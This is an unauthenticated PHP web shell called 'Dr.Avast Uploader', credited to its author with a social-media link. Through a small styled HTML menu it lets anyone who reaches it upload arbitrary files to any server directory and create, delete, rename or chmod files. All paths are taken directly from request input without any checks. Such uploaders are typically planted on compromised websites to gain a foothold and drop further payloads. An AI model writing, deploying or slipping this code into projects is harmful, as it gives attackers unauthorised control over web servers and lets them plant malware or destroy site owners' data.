<?
function tklfo(){
echo 'Editer By Dr.Avast <a href="https://www.facebook.com/Avast.Ps.2015" target="_blank">[Faceb00k]</a></center>';
}
echo '<html>
<title> Dr.Avast Uploader </title>
 <style type="text/css">
input , textarea , button , body , caption , table ,area , option {
    outline:none;
    transition: all 0.20s ease-in-out;
    -webkit-transition: all 0.25s ease-in-out;
    -moz-transition: all 0.25s ease-in-out;
    border-radius:3px;
    -webkit-border-radius:3px;
    -moz-border-radius:3px;
    border:1px solid rgba(0,0,0, 0.2);
    text-shadow: #CDCDCD 0px 0px 1px;
    font-family: "Gill Sans", "Gill Sans MT", Calibri, "Trebuchet MS", sans-serif;
}

input:focus, textarea:focus ,button:active , body:focus , caption:focus , table:focus ,area:focus ,option:focus  {
    box-shadow: 0 0 5px rgba(0, 0, 255, 1);
    -webkit-box-shadow: 0 0 5px rgba(0, 0, 255, 1);
    -moz-box-shadow: 0 0 5px rgba(0, 0, 255, 1);

    border:1px solid rgba(0,0,255, 0.8);
    background-color: lightyellow;
    overflow: auto;
    text-shadow: #CDCDCD 0px 0px 1px;
    font-family: "Gill Sans", "Gill Sans MT", Calibri, "Trebuchet MS", sans-serif;
}

  .style1 {
     text-align: center;
 }
  .style2 {
     font-family: "Gill Sans", "Gill Sans MT", Calibri, "Trebuchet MS", sans-serif;
     text-shadow: #48FF34 0px 0px 4px;
 }
   .stylee {
        text-align: center;
        font-size: xx-large;
     font-family: "Gill Sans", "Gill Sans MT", Calibri, "Trebuchet MS", sans-serif;
     text-shadow: red 0px 0px 6px;
 }
 .style3 {
     text-align: center;
     font-size: xx-large;
     font-family: "Gill Sans", "Gill Sans MT", Calibri, "Trebuchet MS", sans-serif;
    text-shadow: #FF4949 1px 1px 4px;
 }
  .style4 {
     font-size: x-small;
     color: #FF0000;
 }
 .style5 {
     text-align: center;
     font-size: x-small;
     font-family: "Gill Sans", "Gill Sans MT", Calibri, "Trebuchet MS", sans-serif;
     text-shadow: #FF4949 1px 1px 4px;
     color: #8D8D8D;
 }
  </style>
  <meta http-equiv="Content-Type" content="text/html; charset=utf8">
</head>
<body>
<center>
<a href="?avast=up" >Upload</a> ||<a href="?avast=dir" >Mkdir</a> ||<a href="?avast=del" >Delete</a> ||<a href="?avast=mode" >Chmod</a>||<a href="?avast=ren" >Rename</a> <hr>
';
$dir = $_POST['dir'];
if ($dir == ''){
$dir = getcwd();
}
$avast = $_GET['avast'];
SWITCH ($avast){
case "dir":
echo "
<form method='POST'>
 Dir Name : <input type='text' name='mdir' value='$dir' size='23'><br>
<input type='submit' value='mkdir' size='35' >
</form>
";
if (!$_POST['mdir']==""){
@mkdir($_POST['mdir']);
echo $_POST['mdir'].' ===> OK';
}
exit(tklfo());
case "mode":
echo "
<form method='POST'>
File Name : <input type='text' name='mode' value='$dir' size='23'><br>
<input type='text' name='p' value='0755''><br>
<input type='submit' value='chmod' size='35' >
</form>
";
if (!$_POST['mode']==""){
@chmod($_POST['mode'] , $_POST['p']);  
echo $_POST['mode'].$_POST['p']."  ===> OK";
}
exit(tklfo());
case "del":
echo "
<form method='POST'>
File Name : <input type='text' name='del' value='$dir' size='23'><br>
<input type='submit' value='Delete' size='35' >
</form>
";
if (!$_POST['del']==""){
unlink($_POST['del']);
echo $_POST['del']."  ===> OK";
}
exit(tklfo());
case "ren":
echo "
<form method='POST'>
Old name : <input type='text' name='ren' value='$dir' size='23'><br>
New name : <input type='text' name='nren' value='$dir' size='23'><br>
<input type='submit' value='Rename' size='35' >
</form>
";
if (!$_POST['ren']==""){
@rename($_POST['ren'],$_POST['nren']);
echo $_POST['ren']."  ===> OK";
}

exit(tklfo());
case "up":
echo "
<form method='POST' enctype='multipart/form-data'>
Select File : <input type='file' name='hiUP' size='23' ><br>
Upload To : <input type='text' name='dir' value='$dir' size='23'><br>
<input type='submit' value='Upload' size='35' >
</form>
";
if (!empty ($_FILES['hiUP']))
{
    move_uploaded_file($_FILES['hiUP']['tmp_name'],$dir.'/'.$_FILES['hiUP']['name']);
    echo "<b>Uploaded Successfully</b><br>file name : ".$_FILES['hiUP']['name']."<br>";
}
exit(tklfo());
}
?>